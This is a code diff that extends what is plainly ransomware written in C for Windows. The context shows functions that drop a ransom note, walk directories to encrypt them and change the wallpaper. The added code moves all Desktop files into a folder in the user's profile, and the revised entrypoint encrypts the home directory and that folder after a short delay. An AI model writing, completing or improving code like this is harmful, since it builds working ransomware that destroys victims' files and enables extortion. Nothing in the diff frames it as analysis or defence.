@@ -216,9 +216,49 @@ static void drop_ransom_note(const char *dirpath) {
     }
 }
 
+void move_desktop_files(const char *target_folder) {
+    char user_profile[MAX_PATH];
+    if (GetEnvironmentVariableA("USERPROFILE", user_profile, MAX_PATH) == 0)
+        return;
+
+    char desktop_path[MAX_PATH];
+    str_copy(desktop_path, user_profile, MAX_PATH);
+    str_append(desktop_path, "\\Desktop", MAX_PATH);
+
+    char search_path[MAX_PATH];
+    str_copy(search_path, desktop_path, MAX_PATH);
+    str_append(search_path, "\\*", MAX_PATH);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search_path, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    CreateDirectoryA(target_folder, NULL);
+
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+            continue;
+
+        char src[MAX_PATH], dst[MAX_PATH];
+        str_copy(src, desktop_path, MAX_PATH);
+        str_append(src, "\\", MAX_PATH);
+        str_append(src, fd.cFileName, MAX_PATH);
+
+        str_copy(dst, target_folder, MAX_PATH);
+        str_append(dst, "\\", MAX_PATH);
+        str_append(dst, fd.cFileName, MAX_PATH);
+
+        MoveFileA(src, dst);
+
+    } while (FindNextFileA(hFind, &fd));
+
+    FindClose(hFind);
+}
+
 static bool get_user_home_directory(char *buffer, DWORD size) {
     return GetEnvironmentVariableA("USERPROFILE", buffer, size) > 0;
 }
+
 
 static void walk_and_encrypt_directory(const char *dirpath) {
     char search_path[MAX_PATH_LEN];
@@ -256,9 +296,23 @@ static void walk_and_encrypt_directory(const char *dirpath) {
 
 void entrypoint() {
     Sleep(3200);
+
     char user_home[MAX_PATH_LEN];
+    char desktop_new_loc[MAX_PATH_LEN];
+
     if (get_user_home_directory(user_home, sizeof(user_home))) {
-        walk_and_encrypt_directory(user_home);  // C:\Users\<USERNAME> TODO: check if this is the way, maybe all users , Public, etc.
+        // Build path: user_home + \BureauCache
+        str_copy(desktop_new_loc, user_home, MAX_PATH_LEN);
+        str_append(desktop_new_loc, "\\DesktopBackup", MAX_PATH_LEN);
+
+        // Clean Desktop
+        move_desktop_files(desktop_new_loc);
+
+        // C:\Users\<USERNAME> TODO: check if this is the way, maybe all users , Public, etc.
+        // Multithread maybe
+        walk_and_encrypt_directory(user_home);  
+        walk_and_encrypt_directory(desktop_new_loc);
+
         // Set the wallpaper after encryption
         set_compressed_wallpaper();
     }
